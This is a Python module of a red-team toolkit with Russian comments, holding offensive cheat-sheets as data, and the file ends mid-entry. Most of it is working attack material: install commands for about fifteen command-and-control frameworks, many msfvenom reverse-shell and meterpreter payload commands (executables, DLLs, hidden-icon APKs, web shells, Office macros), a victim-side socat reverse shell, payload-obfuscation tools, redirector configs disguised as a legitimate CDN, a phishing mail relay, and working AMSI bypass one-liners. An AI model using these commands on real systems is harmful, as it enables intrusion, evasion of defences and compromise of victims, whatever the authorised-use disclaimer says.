"""
Red Team C2 Integration Pro.
Author: idqwixxa

⚠ Только для авторизованного red team / CTF / своей лаборатории.

Возможности:
    ─── C2 Framework cheat-sheets ───
    - Sliver, Havoc, Mythic, Cobalt Strike, Metasploit, Empire,
      Covenant, PoshC2, Merlin, NimPlant, Brute Ratel, Nighthawk,
      Villain, Caldera, SilentTrinity (15 фреймворков)

    ─── Payload generation ───
    - MSFVenom (Windows / Linux / macOS / Android / Web / Shellcode /
      encoded / wrappers / 15+ форматов)
    - Donut (shellcode from PE/.NET)
    - Shellter (PE infector)
    - Veil, Unicorn, HoaxShell, SharpShooter, Ebowla, Chimera
    - sgn, pe_to_shellcode, Invoke-Obfuscation

    ─── Listener setup ───
    - Metasploit handler, Sliver, Havoc
    - Netcat / socat / ncat / rlwrap

    ─── Red team infrastructure ───
    - Redirectors (nginx/socat/iptables/apache-mod_rewrite)
    - Domain fronting (CDN hints)
    - C2 профилирование (malleable C2)
    - Let's Encrypt для C2
    - Mail redirectors (SMTP)

    ─── Defense evasion ───
    - AMSI bypass (10+ техник)
    - ETW patching
    - PPID spoofing
    - Process injection (10+ техник)
    - Unhooking

    ─── OpSec ───
    - Network / Host / Priv / Logs (расширенные)
    - MITRE ATT&CK mapping (C2 → техники)

    ─── Интеграция ───
    - Findings → notes (audit trail)
    - Notify
    - Экспорт: MD / JSON / TXT / SH

"""
import html as html_mod
import json
import shutil
import subprocess
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path

from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

RT_DIR = REPORT_DIR / "redteam"
RT_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class C2Finding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: C2Finding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["redteam", "c2", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# C2 cheat-sheets (расширенный набор)
# ===========================================================================

C2_SHEETS = {
    "sliver": {
        "title": "Sliver C2 (BishopFox)",
        "language": "Go",
        "license": "GPLv3",
        "install": [
            "curl https://sliver.sh/install | sudo bash",
            "# Docker:",
            "docker run --rm -it -v ~/.sliver:/root/.sliver "
            "bishopfox/sliver:latest",
            "# Из исходников:",
            "git clone https://github.com/BishopFox/sliver && cd sliver && make",
        ],
        "workflow": [
            ("Start server", "sliver-server"),
            ("Create HTTP listener", "http -l 0.0.0.0 -p 8080"),
            ("Create mTLS listener", "mtls -l 0.0.0.0 -p 8888"),
            ("Generate implant (Linux)",
             "generate --mtls attacker.com:8888 --os linux --arch amd64 "
             "--save /tmp/implant"),
            ("Generate implant (Windows)",
             "generate --http attacker.com:8080 --os windows --arch amd64 "
             "--format exe --save /tmp/implant.exe"),
            ("Generate implant (macOS ARM)",
             "generate --mtls attacker.com:8888 --os darwin --arch arm64 "
             "--save /tmp/implant"),
            ("Generate shellcode",
             "generate --mtls attacker.com:8888 --os windows --arch amd64 "
             "--format shellcode --save /tmp/shellcode.bin"),
            ("Generate beacon",
             "generate beacon --mtls attacker.com:8888 --seconds 60 "
             "--jitter 30 --os windows --save /tmp/beacon.exe"),
            ("List sessions", "sessions"),
            ("Interact", "use <session-id>"),
            ("Common commands",
             "# info, ps, ls, pwd, cd, download, upload, shell, execute, "
             "sideload, migrate, getsystem, impersonate"),
            ("Port forward (pivot)",
             "portfwd add --remote 10.0.0.5:445 --bind 127.0.0.1:4455"),
            ("SOCKS5 pivot",
             "socks5 start --port 1080"),
            ("Armory (extensions)",
             "armory install rubeus; armory install seatbelt"),
        ],
    },
    "havoc": {
        "title": "Havoc C2",
        "language": "Go + C",
        "license": "GPLv3",
        "install": [
            "git clone https://github.com/HavocFramework/Havoc.git",
            "cd Havoc && make",
            "./havoc server --profile ./profiles/havoc.yaotl -v",
        ],
        "workflow": [
            ("Listener setup",
             "# GUI → Listeners → Add → HTTP / HTTPS / SMB"),
            ("Payload gen",
             "# Attacks → Payload → выбрать listener, формат (exe/dll/shellcode)"),
            ("Demo profile",
             "# profiles/havoc.yaotl — настройка listener, sleep, injection"),
            ("Sleep obfuscation",
             "# Payload → Config → Sleep Technique: Ekko / Foliage / "
             "Ziliean"),
            ("Injection",
             "# Config → Injection: Self-Inject / CreateThread / "
             "EarlyBird APC / Hollowing"),
            ("Post-exploitation",
             "# Demon session → Commands: shell, upload, download, "
             "ps, ls, screenshot, keylog, tokens"),
        ],
    },
    "mythic": {
        "title": "Mythic C2",
        "language": "Python + Go + Docker",
        "license": "BSD-3",
        "install": [
            "git clone https://github.com/its-a-feature/Mythic",
            "cd Mythic && sudo ./install_docker_ubuntu.sh",
            "sudo ./mythic-cli start",
            "# UI: https://127.0.0.1:7443 (admin / mythic_admin)",
        ],
        "workflow": [
            ("Install agent",
             "sudo ./mythic-cli install github "
             "https://github.com/MythicAgents/Apollo"),
            ("Install C2 profile",
             "sudo ./mythic-cli install github "
             "https://github.com/MythicC2Profiles/http"),
            ("Create payload",
             "# UI: Create Payload → выбрать agent + C2 profile"),
            ("Interact",
             "# UI: Active Callbacks → выбрать → Commands"),
            ("REST API",
             "curl -H 'Mythic: <apikey>' https://127.0.0.1:7443/api/v1.4/..."),
            ("Recommended agents",
             "Apollo (Windows), Poseidon (Linux/macOS), "
             "Apollo, Athena, Atlas, Medusa"),
        ],
    },
    "cobaltstrike": {
        "title": "Cobalt Strike (commercial)",
        "language": "Java",
        "license": "Commercial",
        "install": [
            "# Teamserver (Linux):",
            "sudo ./teamserver <ip> <password> <c2profile>",
            "# Client (Java):",
            "java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap "
            "-jar cobaltstrike.jar",
        ],
        "workflow": [
            ("Listener (HTTP)",
             "# Listeners → Add → Beacon HTTP → host/port/profile"),
            ("Payload gen",
             "# Attacks → Packages → Windows Executable / PowerShell / "
             "HTML Application / MS Office Macro"),
            ("Malleable C2 profile",
             "# Используй примеры из github.com/BC-SECURITY/Malleable-C2-Profiles"),
            ("Post-ex",
             "# Beacon commands: getuid, getsystem, hashdump, "
             "logonpasswords, kerberoast, dcsync, pth, ptt, "
             "make_token, spawn, inject, jump, socks, portscan"),
            ("Aggressor scripts",
             "# Загрузи: load /path/to/script.cna"),
            ("OPsec per listener",
             "# .profile: sleep 60 jitter 30; spawnto x64 svchost.exe"),
        ],
    },
    "metasploit": {
        "title": "Metasploit Framework",
        "language": "Ruby",
        "license": "BSD-3 (community)",
        "install": [
            "# Kali: предустановлен",
            "msfconsole",
            "# Обновить:",
            "msfupdate",
        ],
        "workflow": [
            ("Handler (multi/handler)",
             "use exploit/multi/handler\n"
             "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"
             "set LHOST <ip>\n"
             "set LPORT 4444\n"
             "set ExitOnSession false\n"
             "run -j"),
            ("HTTPS handler",
             "set PAYLOAD windows/x64/meterpreter/reverse_https\n"
             "set HandlerSSLCert /path/to/cert.pem\n"
             "set StagerVerifySSLCert true"),
            ("Persistence",
             "# В meterpreter: run persistence -U -i 30 -p 4444 -r <ip>"),
            ("Pivot",
             "# meterpreter: run autoroute -s 10.0.0.0/8"),
            ("Post modules",
             "# post/windows/gather/hashdump\n"
             "# post/windows/gather/enum_logged_on_users\n"
             "# post/multi/recon/local_exploit_suggester"),
            ("Obfuscated payload",
             "# msfvenom -p ... -e x64/xor_dynamic -i 10 -f exe"),
        ],
    },
    "empire": {
        "title": "PowerShell Empire",
        "language": "PowerShell / Python",
        "license": "BSD-3",
        "install": [
            "git clone https://github.com/BC-SECURITY/Empire.git",
            "cd Empire && sudo ./setup/install.sh",
        ],
        "workflow": [
            ("Start server", "./empire"),
            ("Listener", "(Empire) > listeners\n(Empire: listeners) > uselistener http"),
            ("Stager (Windows)",
             "(Empire: usestager) > usestager windows/launcher_bat"),
            ("Agent enumeration",
             "(Empire: agents) > interact <agent>"),
            ("Modules",
             "(Empire: <agent>) > usemodule powershell/credentials/mimikatz/logonpasswords"),
            ("Modern fork",
             "# Рекомендуется BC-SECURITY fork — активно поддерживается"),
        ],
    },
    "covenant": {
        "title": "Covenant C2 (.NET)",
        "language": ".NET Core",
        "license": "AGPL",
        "install": [
            "git clone --recurse-submodules https://github.com/cobbr/Covenant",
            "cd Covenant/Covenant && dotnet build",
            "dotnet run",
            "# UI: https://127.0.0.1:7443 (admin: CovenantAdmin!)",
        ],
        "workflow": [
            ("Listeners", "# UI → Listeners → Create"),
            ("Launchers",
             "# UI → Launchers → Windows / PowerShell / Binary / "
             "InstallUtil / MSBuild / etc."),
            ("Grunts",
             "# Covenant uses 'Grunts' для callbacks (instead of sessions)"),
            ("Tasks",
             "# UI → Grunts → Interact → Add Task → выбрать из библиотеки"),
            ("Alternative: Covenant in Docker",
             "docker pull cobbr/covenant && docker run -p 7443:7443 cobbr/covenant"),
        ],
    },
    "poshc2": {
        "title": "PoshC2",
        "language": "Python + PowerShell + C#",
        "license": "BSD-3",
        "install": [
            "curl -sSL https://raw.githubusercontent.com/nettitude/"
            "PoshC2/master/Install.sh | sudo bash",
        ],
        "workflow": [
            ("Start", "posh-project -n demo && posh-config"),
            ("Server", "posh-server"),
            ("Client", "posh -u attacker"),
            ("Generate implant",
             "(PoshC2) > gen-payload -t csharp -d -p 443 -h <ip>"),
            ("Interact",
             "(PoshC2) > connect <session-id>"),
            ("Modules",
             "# sharp-hound, sharp-kerberoast, invoke-mimikatz, "
             "seatbelt, lockless, etc."),
        ],
    },
    "merlin": {
        "title": "Merlin C2 (HTTP/2 + HTTP/3)",
        "language": "Go",
        "license": "GPLv3",
        "install": [
            "git clone https://github.com/Ne0nd0g/merlin && cd merlin",
            "make quick",
            "go run cmd/merlin-server/main.go",
        ],
        "workflow": [
            ("Server", "./merlin-server"),
            ("Agent (Windows)",
             "./merlin-agent http --url https://<ip>:443"),
            ("Agent (Linux)",
             "./merlin-agent http --url https://<ip>:443 --psk <psk>"),
            ("HTTP/2 + HTTP/3",
             "# Полная поддержка H2/H3 для обхода NGFW"),
            ("Interact",
             "# В server: interact <agent-id>"),
            ("Modules",
             "# enable javascript, load module <name>, run agent commands"),
        ],
    },
    "nimplant": {
        "title": "NimPlant",
        "language": "Nim",
        "license": "GPLv3",
        "install": [
            "git clone https://github.com/chvancooten/NimPlant",
            "cd NimPlant && pip install -r requirements.txt",
        ],
        "workflow": [
            ("Server",
             "python nimplant.py server"),
            ("Payload",
             "python nimplant.py implant --server <ip>:<port> "
             "--name test --os windows"),
            ("Interact",
             "# В server: use <GUID>"),
            ("Features",
             "# AES-256 payload encryption, XOR key, in-memory, "
             "no file on disk"),
        ],
    },
    "villain": {
        "title": "Villain (multi-session + sibling)",
        "language": "Python",
        "license": "GPLv3",
        "install": [
            "git clone https://github.com/t3l3machus/Villain",
            "cd Villain && pip install -r requirements.txt",
        ],
        "workflow": [
            ("Start", "python3 Villain.py"),
            ("Generate payload",
             "generate payload=<lhost>:<lport> os=<windows|linux>"),
            ("Sibling sessions",
             "# Villain может принимать несколько backdoor-типов одновременно"),
            ("Interact",
             "shell <id>"),
            ("Listeners",
             "# Встроенные: HTTP, HTTPS, TCP (multi-listener)"),
        ],
    },
    "caldera": {
        "title": "MITRE Caldera",
        "language": "Python",
        "license": "Apache 2.0",
        "install": [
            "git clone https://github.com/mitre/caldera.git --recursive",
            "cd caldera && pip install -r requirements.txt",
            "python server.py --insecure",
            "# UI: http://127.0.0.1:8888 (red:admin, blue:blue)",
        ],
        "workflow": [
            ("Agents",
             "# UI → Agents → Deploy (Sandcat / Manx / 54ndc47)"),
            ("Adversaries",
             "# UI → Adversaries → выбрать профиль (Discovery, Hunter, etc.)"),
            ("Operations",
             "# UI → Operations → Run → выбрать adversary + agent + group"),
            ("Custom abilities",
             "# plugins/ — добавь свои ability.py / ability.yml"),
            ("Auto-emulation",
             "# 'Fact source' + 'Planner' для автономной эмуляции APT"),
        ],
    },
    "silenttrinity": {
        "title": "SilentTrinity",
        "language": "Python + .NET",
        "license": "BSD-3",
        "install": [
            "git clone https://github.com/byt3bl33d3r/SILENTTRINITY",
            "cd SILENTTRINITY && pip3 install -r requirements.txt",
            "python3 st.py",
        ],
        "workflow": [
            ("Listener",
             "listeners\nuse http\nstart"),
            ("Stager",
             "stagers\nuse msbuild\noptions\ngenerate"),
            ("Sessions",
             "sessions\ninteract <id>"),
            ("Modules",
             "modules\nuse boo/...\n"),
        ],
    },
    "c3": {
        "title": "C3 (Custom Command & Control)",
        "language": "Python",
        "license": "MIT",
        "install": [
            "pip install c3",
            "c3 --help",
        ],
        "workflow": [
            ("Create channel",
             "c3 channels create"),
            ("Listeners",
             "# c3 channels/listeners → богатый toolkit"),
            ("Особенность",
             "# Формат: 'чат' между оператором и сессией (Slack-like)"),
        ],
    },
}


# ===========================================================================
# MSFVenom (расширенный)
# ===========================================================================

MSFVENOM_SHEETS = {
    "windows_exe": [
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
        "msfvenom -p windows/x64/meterpreter/reverse_https "
        "LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
        "msfvenom -p windows/x64/shell_reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f exe -e x64/xor_dynamic -i 5 "
        "-o shell.exe",
        "msfvenom -p windows/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f exe -a x86 --platform windows "
        "-o shell32.exe",
    ],
    "windows_dll": [
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f dll -o evil.dll",
        "# Затем: rundll32.exe evil.dll,<entrypoint>",
        "# Или: regsvr32 /s /u /i:evil.dll scrobj.dll",
    ],
    "windows_msi": [
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f msi -o evil.msi",
        "# Установка: msiexec /i evil.msi /quiet",
    ],
    "linux_elf": [
        "msfvenom -p linux/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
        "msfvenom -p linux/x64/shell_reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f elf -o shell.elf",
        "chmod +x shell.elf && ./shell.elf",
    ],
    "macos": [
        "msfvenom -p osx/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f macho -o shell.macho",
        "msfvenom -p osx/x64/shell_reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f macho -o shell.macho",
        "# Нужна подпись (codesign) или --no-verification при запуске",
    ],
    "android": [
        "msfvenom -p android/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -o evil.apk",
        "msfvenom -p android/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -o evil.apk "
        "AndroidWakelock=true AndroidHideAppIcon=true",
    ],
    "java_jar": [
        "msfvenom -p java/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f jar -o evil.jar",
        "msfvenom -p java/jsp_shell_reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f raw -o shell.jsp",
    ],
    "web_asp": [
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f asp -o shell.asp",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f aspx -o shell.aspx",
    ],
    "web_php": [
        "msfvenom -p php/meterpreter_reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f raw -o shell.php",
        "msfvenom -p php/reverse_php "
        "LHOST={lhost} LPORT={lport} -f raw -o shell.php",
    ],
    "shellcode": [
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f c -o shellcode.c",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f python -o shellcode.py",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f raw -o shellcode.bin",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f hex -o shellcode.hex",
    ],
    "encoded": [
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f exe -e x64/xor_dynamic -i 10 "
        "-o shell.exe",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f exe -e x64/zutto_dekiru "
        "-o shell.exe",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f exe -e x86/shikata_ga_nai -i 15 "
        "-o shell.exe",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f exe "
        "-e x64/pe_to_shellcode -i 5 -o shell.exe",
    ],
    "wrappers": [
        "# PowerShell (base64-encoded)",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f psh-reflection -o shell.ps1",
        "# VBA macro (для Office)",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f vba -o macro.vba",
        "# HTA",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f hta-psh -o shell.hta",
        "# VBScript",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f vbs -o shell.vbs",
        "# MSI (с UAC bypass)",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST={lhost} LPORT={lport} -f msi-nouac -o evil.msi",
    ],
    "staged_vs_stageless": [
        "# Staged (меньший размер, callback)",
        "windows/x64/meterpreter/reverse_tcp",
        "linux/x64/meterpreter/reverse_tcp",
        "# Stageless (больше, но one-shot)",
        "windows/x64/meterpreter_reverse_tcp",
        "linux/x64/meterpreter_reverse_tcp",
        "# Stageless предпочтительнее для HTTPS + обхода AV",
    ],
    "udp_dns": [
        "# UDP reverse shell",
        "msfvenom -p windows/x64/meterpreter/reverse_udp "
        "LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
        "# DNS (для egress bypass)",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST=ns1.{lhost} LPORT={lport} -f exe -o dns_c2.exe",
    ],
}


# ===========================================================================
# Payload generators (расширенный)
# ===========================================================================

PAYLOAD_GENERATORS = {
    "donut": {
        "title": "Donut — shellcode from PE/.NET",
        "url": "https://github.com/TheWover/donut",
        "commands": [
            "git clone https://github.com/TheWover/donut && cd donut",
            "make",
            "./donut -f 1 -o payload.bin -a 2 -p \"args\" implant.exe",
            "# Encode to base64:",
            "base64 -w0 payload.bin > payload.b64",
            "# In-memory loading in PowerShell:",
            "[Reflection.Assembly]::Load([Convert]::FromBase64String('...'))",
        ],
    },
    "shellter": {
        "title": "Shellter — PE infector (поиск уязвимого exe)",
        "url": "https://www.shellterproject.com/",
        "commands": [
            "# Linux: apt install shellter (или wine-shellter.exe)",
            "shellter",
            "# В интерактиве: A (auto) → путь к target.exe → "
            "stealth mode → payload type (meterpreter) → LHOST/LPORT",
            "# Результат: target.exe с внедрённым shellcode",
        ],
    },
    "veil": {
        "title": "Veil Framework",
        "url": "https://github.com/Veil-Framework/Veil",
        "commands": [
            "git clone https://github.com/Veil-Framework/Veil && cd Veil",
            "./config/setup.sh -c",
            "./Veil.py",
            "# use 1 (Evasion) → list → выбрать payload (e.g. 41 — "
            "powershell/meterpreter/rev_tcp) → set LHOST/LPORT → generate",
        ],
    },
    "unicorn": {
        "title": "Unicorn — PowerShell downgrade attack",
        "url": "https://github.com/trustedsec/unicorn",
        "commands": [
            "git clone https://github.com/trustedsec/unicorn",
            "python unicorn.py windows/meterpreter/reverse_https "
            "{lhost} {lport}",
            "# Генерирует: powershell_attack.txt (payload) + "
            "unicorn.rc (metasploit resource)",
            "msfconsole -r unicorn.rc",
        ],
    },
    "hoaxshell": {
        "title": "hoaxshell — reverse shell via HTTP requests",
        "url": "https://github.com/t3l3machus/hoaxshell",
        "commands": [
            "git clone https://github.com/t3l3machus/hoaxshell",
            "cd hoaxshell && python hoaxshell.py -s {lhost}",
            "# Скопируй payload в цель (Windows — через "
            "powershell -enc ...)",
            "# Опции: --https, --port, -i (обход AV через "
            "имперсонацию legitimate процессов)",
        ],
    },
    "sharpshooter": {
        "title": "SharpShooter — payload framework",
        "url": "https://github.com/mdsecactivebreach/SharpShooter",
        "commands": [
            "git clone https://github.com/mdsecactivebreach/SharpShooter",
            "cd SharpShooter",
            "python SharpShooter.py --payload js --delivery web "
            "--web 1 --output payload.js --stageless",
            "# Или: --payload hta / vbs / wsf / macro / dropper",
        ],
    },
    "ebowla": {
        "title": "Ebowla — encrypted payload",
        "url": "https://github.com/Genetic-Malware/Ebowla",
        "commands": [
            "git clone https://github.com/Genetic-Malware/Ebowla",
            "cd Ebowla && pip install -r requirements.txt",
            "python ebowla.py payload.exe genetic.config",
            "# Encrypts payload with env-dependent key → " \
            "target-specific",
        ],
    },
    "chimera": {
        "title": "Chimera — PowerShell obfuscation",
        "url": "https://github.com/tokyoneon/Chimera",
        "commands": [
            "git clone https://github.com/tokyoneon/Chimera",
            "cd Chimera && ./chimera.sh -f payload.ps1 "
            "-o obfuscated.ps1 -v 3",
        ],
    },
    "sgn": {
        "title": "SGN — Shikata Ga Nai encoder (shellcode)",
        "url": "https://github.com/EgeBalci/sgn",
        "commands": [
            "git clone https://github.com/EgeBalci/sgn && cd sgn",
            "go build",
            "./sgn -a 64 -f raw -i shellcode.bin -o shellcode.sgn "
            "-m 1 -e 1",
        ],
    },
    "pe_to_shellcode": {
        "title": "pe_to_shellcode — PE → shellcode",
        "url": "https://github.com/hasherezade/pe_to_shellcode",
        "commands": [
            "git clone https://github.com/hasherezade/pe_to_shellcode",
            "cd pe_to_shellcode && make",
            "./pe2shc input.exe output.bin",
            "# Загрузи через custom loader / injector",
        ],
    },
    "invoke_obfuscation": {
        "title": "Invoke-Obfuscation — PowerShell AST obfuscation",
        "url": "https://github.com/danielbohannon/Invoke-Obfuscation",
        "commands": [
            "# В PowerShell-сессии:",
            "Import-Module ./Invoke-Obfuscation.psd1",
            "Invoke-Obfuscation",
            "SET SCRIPTPATH payload.ps1",
            "AST",
            "ALL",
            "1",
            "OUT obfuscated.ps1",
        ],
    },
    "sharpgen": {
        "title": "SharpGen — C# → shellcode",
        "url": "https://github.com/cobbr/SharpGen",
        "commands": [
            "docker run -it --rm -v $(pwd):/app cobbr/sharpgen",
            "SharpGen.exe -f output.exe -d output.bin -c "
            "sharpgen_config.yaml",
        ],
    },
}


# ===========================================================================
# Listener setup
# ===========================================================================

LISTENERS = {
    "metasploit_handler": {
        "title": "Metasploit multi/handler",
        "commands": [
            "use exploit/multi/handler",
            "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            "set LHOST {lhost}",
            "set LPORT {lport}",
            "set ExitOnSession false",
            "set EnableStageEncoding true",
            "set StageEncoder x64/xor_dynamic",
            "set AutoRunScript post/multi/manage/shell_to_meterpreter",
            "run -j",
        ],
    },
    "nc_rlwrap": {
        "title": "Netcat + rlwrap",
        "commands": [
            "rlwrap nc -lvnp {lport}",
            "# Для полной стабилизации:",
            "rlwrap nc -lvnp {lport} -c 'echo -e \"\\x1b[?25h\"'",
        ],
    },
    "socat": {
        "title": "Socat (полная PTY-стабилизация)",
        "commands": [
            "socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
            "# На жертве:",
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
            "tcp:{lhost}:{lport}",
        ],
    },
    "ncat_ssl": {
        "title": "Ncat + SSL",
        "commands": [
            "# Сгенерировать cert:",
            "openssl req -x509 -newkey rsa:4096 -keyout key.pem "
            "-out cert.pem -days 365 -nodes",
            "ncat --ssl --ssl-cert cert.pem --ssl-key key.pem "
            "-lvnp {lport}",
        ],
    },
    "python_http": {
        "title": "Python HTTP listener (для curl/wget delivery)",
        "commands": [
            "python3 -m http.server {lport} --bind 0.0.0.0",
            "# Или upload-server:",
            "pip install uploadserver && python3 -m uploadserver {lport}",
        ],
    },
    "ncat_multiple": {
        "title": "Ncat multiple clients + broker",
        "commands": [
            "ncat -lvnp {lport} -k --broker",
            "# -k = keep listening, --broker = multiple clients",
        ],
    },
}


# ===========================================================================
# Red team infrastructure
# ===========================================================================

INFRASTRUCTURE = {
    "nginx_redirector": {
        "title": "Nginx C2 redirector (Tier 1 → Tier 2)",
        "config": """# /etc/nginx/sites-available/c2-redirector
server {
    listen 80;
    listen 443 ssl http2;
    server_name cdn.legit-looking.com;

    ssl_certificate     /etc/letsencrypt/live/cdn/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn/privkey.pem;

    # Скрыть версию
    server_tokens off;

    # Профиль-фильтр: только правильный User-Agent + URI
    location /api/v1/health {
        # Проверяем UA
        if ($http_user_agent !~ "Mozilla/5.0 \\(Windows NT 10.0") {
            return 404;
        }
        # Проверяем кастомный header (из malleable C2)
        if ($http_x_custom_header != "expected-value") {
            return 404;
        }
        # Форвардим на tier 2 (Havoc/Sliver/Cobalt)
        proxy_pass https://10.0.0.5:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_ssl_verify off;
    }

    # Всё остальное → legit decoy (facebook.com)
    location / {
        proxy_pass https://www.facebook.com;
    }
}
""",
    },
    "socat_redirector": {
        "title": "Socat simple redirector",
        "commands": [
            "# Tier 1 (public IP):",
            "socat TCP-LISTEN:443,fork,reuseaddr "
            "TCP:tier2.internal:8443",
            "# Для HTTPS (нужен cert):",
            "socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork "
            "OPENSSL:tier2.internal:8443,verify=0",
        ],
    },
    "iptables_redirector": {
        "title": "iptables port redirector",
        "commands": [
            "sysctl -w net.ipv4.ip_forward=1",
            "iptables -t nat -A PREROUTING -p tcp --dport 443 "
            "-j DNAT --to-destination 10.0.0.5:8443",
            "iptables -t nat -A POSTROUTING -p tcp -d 10.0.0.5 "
            "--dport 8443 -j MASQUERADE",
        ],
    },
    "domain_fronting": {
        "title": "Domain fronting (CDN hints)",
        "notes": [
            "CloudFront: работает через правильный Host header",
            "Azure CDN: работает через правильный SNI + Host",
            "Fastly: часто блокируется, но встречается",
            "Google: закрыли domain fronting для Google App Engine",
            "Cloudflare Workers: замаскировать через собственный worker",
            "Обход NGFW: HTTPS SNI=legit-cdn.com, Host=attacker.com",
        ],
    },
    "malleable_c2": {
        "title": "Malleable C2 profile (Cobalt Strike / Havoc)",
        "notes": [
            "Профиль маскирует traffic под legit (jQuery / Google / Slack)",
            "Примеры: github.com/BC-SECURITY/Malleable-C2-Profiles",
            "Для Havoc: profiles/havoc.yaotl (свой формат)",
            "Для Sliver: можно использовать HTTP-профиль через implant config",
        ],
    },
    "letsencrypt_c2": {
        "title": "Let's Encrypt для C2 домена",
        "commands": [
            "# Используй свой legit домен (не связанный с attacker)",
            "certbot certonly --standalone -d cdn.legit-looking.com "
            "--agree-tos -m admin@legit-looking.com",
            "# Автообновление:",
            "certbot renew --deploy-hook "
            "'systemctl reload nginx'",
        ],
    },
    "mail_redirector": {
        "title": "SMTP redirector для phishing",
        "commands": [
            "# Postfix relay на VPS",
            "apt install postfix",
            "# /etc/postfix/main.cf:",
            "relayhost = [smtp.provider.com]:587",
            "smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd",
            "smtp_sasl_auth_enable = yes",
            "smtp_use_tls = yes",
        ],
    },
}


# ===========================================================================
# Defense evasion
# ===========================================================================

DEFENSE_EVASION = {
    "amsi_bypass": {
        "title": "AMSI bypass (10+ техник)",
        "commands": [
            "# 1. Патчинг AmsiScanBuffer в памяти (отработает до обновлений)",
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "# 2. Обнуление amsiContext",
            "$a=[Ref].Assembly.GetTypes();"
            "Foreach($b in $a){if($b.Name -like '*iUtils')"
            "{$c=$b}};"
            "$d=$c.GetFields('NonPublic,Static');"
            "Foreach($e in $d){if($e.Name -like '*Context'){$f=$e}};"
            "$f.SetValue($null,[IntPtr]::Zero)",
            "# 3. Через VEH / kernel32",
            "# 4. dotnet amsi.dll unhook",
            "# 5. EtwEventWrite патчинг (для ETW)",
            "[System.Diagnostics.Eventing.EventProvider]"
            "::new() # через reflection",
            "# 6. RastaMouse AMSI bypass (закрыт в Windows 10 22H2+)",
            "[Runtime.InteropServices.Marshal]::WriteInt32("
            "[Runtime.InteropServices.Marshal]::ReadInt32("
            "[Ref].Assembly.GetType('System.Management.Automation."
            "AmsiUtils').GetField('amsiContext','NonPublic,Static')"
            ".GetValue($null)),-1)",
            "# 7. AMSI.dll unhook через hardware breakpoints",
            "# 8. Обфускация строк (base64/реверс/case-shuffle)",
            "# 9. .NET-инжект без AMSI (ручной PE loader)",
            "# 10. AMSI bypass через COM (не работает на новых билдах)",
            "# РЕКОМЕНДАЦИЯ: используй готовые шаблоны для текущей "
            "версии Windows",
        ],
    },
    "etw_patch": {
        "title": "ETW patching (обход логирования)",
        "commands": [
            "# PowerShell — обход ScriptBlockLogging",
